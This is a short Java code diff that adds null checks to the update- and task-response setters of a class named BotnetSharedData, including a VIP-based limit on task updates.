@@ -25,9 +25,11 @@ public final class BotnetSharedData {
     }
 
     public void setUpdateResponse(UpdateResponse updateResponse) {
-        this.updateResponse = updateResponse;
-        var vip = SharedUtils.toBoolean(updateResponse.getVip());
-        maxTaskUpdates = vip ? MAX_VIP_TASKS : MAX_TASKS;
+        if (updateResponse != null) {
+            this.updateResponse = updateResponse;
+            var vip = SharedUtils.toBoolean(updateResponse.getVip());
+            maxTaskUpdates = vip ? MAX_VIP_TASKS : MAX_TASKS;
+        }
     }
 
     public TaskResponse getTaskResponse() {
@@ -35,7 +37,9 @@ public final class BotnetSharedData {
     }
 
     public void setTaskResponse(TaskResponse taskResponse) {
-        this.taskResponse = taskResponse;
+        if (taskResponse != null) {
+            this.taskResponse = taskResponse;
+        }
     }
 
     public int getMaxTaskUpdates() {
